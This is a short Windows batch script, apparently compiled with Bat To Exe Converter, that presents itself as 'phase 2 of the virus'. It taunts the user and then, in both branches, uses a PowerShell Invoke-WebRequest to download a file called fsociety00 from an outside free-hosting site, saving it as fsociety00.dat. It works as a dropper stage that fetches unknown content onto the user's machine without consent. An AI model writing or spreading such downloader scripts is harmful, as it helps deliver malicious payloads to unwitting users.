::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCxVQA+HLiv5Ve1JuLvHy++UqVkSRN4RfZib3LuCJOUBqg22PKodxHVQncgYTEsIMBeza28=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 57
echo I see you escaped the test didn't you?(yes/no)
set /p answer=
if %answer%==yes goto activate
if %answer%==no goto confused
:confused
echo WOOOOOOOOOOOW
echo So you tell me that somehow the program skipped the code phase
echo And redirected you to Form2?
echo Well then I guess I need to see what errors I did in it
echo But I don't care so your still gonna get phase 2 of the virus
echo PROJECT 00.DAT ACTIVATE!
powershell -Command "Invoke-webRequest https://7241840012.000webhostapp.com/fsociety00 -Outfile fsociety00.dat"
pause
cls
pause
cls
exit
:activate
echo but trust me you won't escape this one
echo PROJECT 00.DAT ACTIVATE!
powershell -Command "Invoke-webRequest https://7241840012.000webhostapp.com/fsociety00 -Outfile fsociety00.dat"
cls
pause
cls
exit
